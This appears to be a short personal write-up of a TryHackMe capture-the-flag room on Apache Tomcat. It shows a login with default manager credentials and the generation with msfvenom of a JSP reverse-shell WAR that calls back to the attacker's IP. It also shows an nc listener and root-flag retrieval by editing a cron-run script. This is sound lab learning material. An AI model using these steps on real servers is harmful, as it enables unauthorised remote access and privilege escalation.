#tomcat #war #msfvenom

https://tryhackme.com/r/room/bsidesgtthompson

---
#### Nmap
![[Screenshot_2024-05-13_18-03-32.png]]
I went on `8080` and I used `tomcat:s3cret` as creds. I've found it in the error message suggestion when you enter wrong credentials.

I will probably have to going by uploading a `.war` file

I m gonna use this [doc](https://node-security.com/posts/jsp-war-shell/) and [this](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat) one
I need to find a payload with `msfvenom`:
![[Screenshot_2024-05-13_18-55-09.png]]

I'll do my reverse shell with:
```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.14.97.56 LPORT=8010 -f war -o reshell.war
```

```shell
nc -lvnp 8010
```

I uploaded the revshell on the tomcat dashboard and a clicked on the revshell
![[Screenshot_2024-05-13_19-02-20.png]]

*And here I am*

The user.txt was in `/home/jack` with 2 others files, one sh writing in the txt every minutes because I checked `cat /etc/crontab`
So I just had to add this line in the sh:
```shell
cat /root/root.txt > file
```
And then `cat` the file and here is the root flag

